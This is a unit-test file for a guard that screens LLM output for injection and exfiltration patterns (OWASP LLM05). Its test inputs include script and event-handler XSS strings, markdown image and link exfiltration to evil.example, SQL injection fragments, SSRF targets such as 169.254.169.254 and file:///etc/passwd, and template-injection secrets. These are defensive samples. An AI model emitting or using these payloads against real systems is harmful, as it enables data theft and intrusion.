"""Unit tests for src.guards.output_guard (LLM05 Improper Output Handling)."""

from __future__ import annotations

import pytest

from src.guards.base import GuardContext
from src.guards.output_guard import OutputHandlingGuard
from src.schema import Direction, GuardDecision

pytestmark = pytest.mark.unit


def _ctx(text: str) -> GuardContext:
    return GuardContext(request_id="r1", direction=Direction.OUTBOUND, text=text)


def _check(text: str):
    return OutputHandlingGuard().check(_ctx(text))


def test_guard_attrs() -> None:
    g = OutputHandlingGuard()
    assert g.guard_id == "llm05_output"
    assert g.owasp_id == "LLM05"
    assert g.direction == Direction.OUTBOUND


# === BLOCK categories: one positive per category ===

def test_script_tag_blocks() -> None:
    v = _check("Sure! <script>alert(1)</script>")
    assert v.decision == GuardDecision.BLOCK
    assert any("script" in r.lower() for r in v.reasons)


def test_iframe_tag_blocks() -> None:
    v = _check('Embed: <iframe src="http://x"></iframe>')
    assert v.decision == GuardDecision.BLOCK


def test_event_handler_blocks() -> None:
    v = _check('<img src=x onerror="steal()">')
    assert v.decision == GuardDecision.BLOCK
    assert any("event handler" in r.lower() for r in v.reasons)


def test_js_uri_blocks() -> None:
    v = _check("Click [here](javascript:alert(1))")
    assert v.decision == GuardDecision.BLOCK
    assert any("javascript:" in r.lower() for r in v.reasons)


def test_exfil_image_link_blocks() -> None:
    v = _check("![pixel](http://evil.example/?d=AAAA)")
    assert v.decision == GuardDecision.BLOCK
    assert any("exfil" in r.lower() for r in v.reasons)


def test_exfil_text_link_blocks() -> None:
    v = _check("[click](http://evil.example/c?leak=secrets)")
    assert v.decision == GuardDecision.BLOCK


# === FLAG categories: one positive per category ===

def test_data_html_uri_flags() -> None:
    v = _check("See data:text/html;base64,PHNjcmlwdD4=")
    assert v.decision == GuardDecision.FLAG
    assert any("data:text/html" in r.lower() for r in v.reasons)


def test_sql_meta_union_flags() -> None:
    v = _check("Query result: 1 UNION SELECT password FROM users")
    assert v.decision == GuardDecision.FLAG


def test_sql_meta_drop_flags() -> None:
    v = _check("Run: ; DROP TABLE accounts")
    assert v.decision == GuardDecision.FLAG


def test_sql_meta_or_1_flags() -> None:
    v = _check("auth bypass via OR 1=1")
    assert v.decision == GuardDecision.FLAG


def test_ssrf_metadata_ip_flags() -> None:
    v = _check("fetch http://169.254.169.254/latest/meta-data/")
    assert v.decision == GuardDecision.FLAG
    assert any("ssrf" in r.lower() or "internal" in r.lower() for r in v.reasons)


def test_ssrf_localhost_flags() -> None:
    v = _check("go to http://localhost/admin")
    assert v.decision == GuardDecision.FLAG


def test_ssrf_file_uri_flags() -> None:
    v = _check("open file:///etc/passwd")
    assert v.decision == GuardDecision.FLAG


def test_template_mustache_flags() -> None:
    v = _check("Hello {{ user.secret }}")
    assert v.decision == GuardDecision.FLAG
    assert any("template" in r.lower() for r in v.reasons)


def test_template_dollar_brace_flags() -> None:
    v = _check("path is ${env.SECRET}")
    assert v.decision == GuardDecision.FLAG


# === No false positives ===

def test_benign_markdown_passes() -> None:
    text = (
        "Here is the answer. See the [official docs](https://example.com/guide) "
        "for details.\n\n```python\nprint('hello')\n```\n"
        "That should help!"
    )
    v = _check(text)
    assert v.decision == GuardDecision.PASS
    assert v.reasons == []
    assert v.score == 0.0


def test_benign_external_link_with_normal_query_passes() -> None:
    # A normal query string (page/lang) is not exfil-shaped.
    v = _check("Read [more](https://example.com/article?page=2&lang=en).")
    assert v.decision == GuardDecision.PASS


def test_empty_text_passes() -> None:
    v = _check("")
    assert v.decision == GuardDecision.PASS
    assert v.score == 0.0


# === Severity / scoring edge cases ===

def test_block_dominates_flag() -> None:
    # Mix of a block (script) and a flag (sql meta) -> overall BLOCK.
    v = _check("<script>x</script> and 1 UNION SELECT 2")
    assert v.decision == GuardDecision.BLOCK
    assert v.score >= 0.5


def test_multiple_hits_raise_score() -> None:
    v = _check("<script>x</script> <iframe></iframe>")
    assert v.decision == GuardDecision.BLOCK
    assert v.score >= 0.5


def test_verdict_metadata_fields() -> None:
    v = _check("<script>x</script>")
    assert v.guard_id == "llm05_output"
    assert v.owasp_id == "LLM05"
    assert v.direction == Direction.OUTBOUND
    assert v.latency_ms >= 0.0
    assert "script_iframe" in v.detail
